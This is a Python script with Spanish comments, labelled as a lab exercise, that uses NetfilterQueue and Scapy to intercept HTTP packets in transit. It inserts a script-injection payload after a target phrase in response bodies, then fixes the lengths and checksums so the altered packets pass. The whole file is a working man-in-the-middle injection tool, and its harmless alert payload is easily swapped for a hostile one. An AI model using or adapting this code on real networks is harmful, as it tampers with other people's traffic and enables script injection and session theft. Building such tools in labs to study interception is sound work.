from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

# Payload de la inyección de script (laboratorio)
PAYLOAD = b'"><script>alert("Has sido hackeado!!")</script>'

def recalculate(pkt):
    """
    Recalcula longitudes y checksums de un paquete IP/TCP después de modificar el contenido.

    Args:
        pkt (scapy.packet.Packet): Paquete IP/TCP modificado.

    Returns:
        scapy.layers.inet.IP: Paquete con campos recalculados.
    """
    # Aseguramos que sea un paquete IP
    if IP in pkt:
        # Eliminamos campos que deben recalcularse
        if hasattr(pkt[IP], "len"):
            del pkt[IP].len
        if hasattr(pkt[IP], "chksum"):
            del pkt[IP].chksum

    if TCP in pkt and hasattr(pkt[TCP], "chksum"):
        del pkt[TCP].chksum

    # Forzamos a Scapy a regenerar todo a partir de los bytes
    pkt = IP(bytes(pkt))
    return pkt


def intercept(packet):
    """
    Intercepta paquetes desde la cola de NetfilterQueue, detecta posible tráfico HTTP
    y, si encuentra un patrón específico en el cuerpo, intenta inyectar un payload.

    Args:
        packet (netfilterqueue.Packet): Paquete interceptado por NetfilterQueue.
    """
    try:
        # Bytes crudos que vienen desde el kernel
        payload = packet.get_payload()

        # Intentamos parsear como paquete IP
        spkt = IP(payload)

        print("[+] Paquete recibido en NFQUEUE")

        # Solo nos interesan paquetes TCP con datos (Raw)
        if not (spkt.haslayer(TCP) and spkt.haslayer(Raw)):
            # No es TCP con payload, lo dejamos pasar
            packet.accept()
            return

        raw_load = spkt[Raw].load

        # Detección general de posible tráfico HTTP
        if b"HTTP/" in raw_load or b"GET " in raw_load or b"POST " in raw_load:
            print("[+] Paquete con posible trafico HTTP")
            # Para depuración, mostramos un resumen
            print("    {}:{} -> {}:{}".format(
                spkt[IP].src,
                spkt[TCP].sport,
                spkt[IP].dst,
                spkt[TCP].dport
            ))
            # Opcional: ver parte del contenido HTTP
            # print(raw_load[:300])

        # Patrón específico que queremos modificar
        objetivo = b"Copyleft 1985-2025"

        if objetivo in raw_load:
            print("[+] Frase objetivo encontrada en el cuerpo HTTP, intentando inyectar payload")

            # Inyección simple: reemplazamos la primera ocurrencia de la frase
            # por la misma frase seguida del PAYLOAD
            nuevo_raw = raw_load.replace(objetivo, objetivo + PAYLOAD, 1)

            # Actualizamos el contenido en la capa Raw
            spkt[Raw].load = nuevo_raw

            # Recalculamos longitudes y checksums
            spkt = recalculate(spkt)

            # Actualizamos el payload del paquete de NetfilterQueue
            packet.set_payload(bytes(spkt))

            print("[+] Paquete modificado y checksums recalculados")

        # En todos los casos, dejamos pasar el paquete
        packet.accept()

    except Exception as e:
        # Si algo falla, lo mostramos pero no bloqueamos el tráfico
        print(f"[!] Error en intercept: {e}")
        packet.accept()


def main():
    """
    Función principal que configura y ejecuta NetfilterQueue.
    Asegúrate de tener reglas iptables que envíen el tráfico a la cola 1.
    """
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, intercept)

    try:
        print("[+] Esperando paquetes HTTP en la cola 1...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[+] Interrupcion por el usuario, saliendo...")
    finally:
        nfqueue.unbind()
        print("[+] Cola NFQUEUE liberada correctamente")


if __name__ == "__main__":
    main()